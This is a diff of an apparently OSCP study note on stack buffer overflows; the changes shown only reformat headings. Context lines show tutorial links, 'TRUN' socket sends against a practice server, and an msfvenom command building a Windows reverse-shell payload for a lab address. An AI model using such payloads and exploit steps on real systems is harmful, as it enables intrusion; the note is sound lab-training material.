@@ -1,10 +1,12 @@
-# Buffer Overflow 
+## Buffer Overflow 
+
+### Links
 - [Tib3rius](obsidian://open?vault=Obsidian%20Vault&file=OSCP%2FRandom%20Notes%2FTib3rius%2FBuffer%20Overflow)
 - [Justin Steve BufferOverflow](https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/dostackbufferoverflowgood_tutorial.pdf)
 - [Convert Little Endian](https://www.save-editor.com/tools/wse_hex.html)
 - [Tib3rius BufferOverflow Github](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)
 - [3isenHeim BufferOverflow GitHub](https://github.com/3isenHeiM/OSCP-BoF)
-## General Steps
+### General Steps
 
 ```
 The Stack
@@ -67,7 +69,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.150.132 LPORT=4444 EXITFUNC=
 
 ```
 
-## Buffer Skeleton Program
+### Buffer Skeleton Program
 ```
 Buffer Over flow using Tib3rius Notes
 
@@ -112,7 +114,7 @@ except:
 
 ```
 
-## Parameters File
+### Parameters File
 
 ```
 # PARAMETERS.py
@@ -147,7 +149,7 @@ sub_esp_10 = b"\x83\xec\x10"
 
 ```
 
-## Create Bad Chars File
+### Create Bad Chars File
 
 ```
 #!/usr/bin/env python
@@ -160,7 +162,7 @@ print()
 
 ```
 
-## Quasi Auto Fuzzer
+### Quasi Auto Fuzzer
 ```
 
 # Fuzzer.py
@@ -189,7 +191,7 @@ while True:
 
 ```
 
-## TryHackMe Fuzzer
+### TryHackMe Fuzzer
 
 
 ```
@@ -224,7 +226,7 @@ while True:
 ```
 
 
-## TryHackMe Exploit Code
+### TryHackMe Exploit Code
 
 ```
 import socket
@@ -254,7 +256,7 @@ except:
 
 
 ```
-## 1 Trigger Bug
+### 1 Trigger Bug
 
 ```
 
@@ -274,7 +276,7 @@ s.send(buf)
 
 ```
 
-## 2 Find Offset
+### 2 Find Offset
 
 ```
 #!/usr/bin/env python2
@@ -300,7 +302,7 @@ s.send('TRUN /.:/'+buf)
 
 ```
 
-## 3 Confirm Offset
+### 3 Confirm Offset
 
 ```
 #!/usr/bin/env python2
@@ -327,7 +329,7 @@ s.send('TRUN /.:/'+buf)
 ```
 
 
-## 4 Find Bad Chars
+### 4 Find Bad Chars
 
 ```
 
@@ -370,7 +372,7 @@ s.send('TRUN /.:/'+buf)
 ```
 
 
-## 5 The JMP
+### 5 The JMP
 
 ```
 
@@ -403,7 +405,7 @@ s.send('TRUN /.:/'+buf)
 ```
 
 
-## 6 Pop Calc
+### 6 Pop Calc
 
 ```
 #!/usr/bin/env python2
@@ -464,7 +466,7 @@ s.send(buf)
 
 ```
 
-## 7 Pop Shell
+### 7 Pop Shell
 
 ```
 
@@ -529,7 +531,7 @@ s.send('TRUN /.:/'+buf)
 
 ```
 
-## Smash The Stack Notes
+### Smash The Stack Notes
 
 ```
 
